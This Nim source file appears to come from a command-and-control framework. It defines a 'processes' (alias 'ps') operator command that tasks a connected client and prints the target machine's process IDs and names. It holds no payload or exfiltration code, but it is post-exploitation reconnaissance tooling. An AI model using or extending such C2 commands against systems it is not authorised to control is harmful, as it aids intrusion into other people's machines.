import asyncdispatch, strutils, tables, terminal

import ../../types, ../../communication, ../../logging

import ../../../clientTasks/processes

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await processes.sendTask(client)
    if not task.isNil(): 
      await task.awaitResponse()
      for process in client.processes:
        stdout.styledWriteLine fgGreen, $process.id, "\t", fgWhite, process.name 

let cmd*: Command = Command(
  execProc: execProc,
  name: "processes",
  argsLength: 0,
  aliases: @["ps"],
  usage: @["processes"],
  cliMode: @[ClientInteractMode],
  description: "List processes on target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)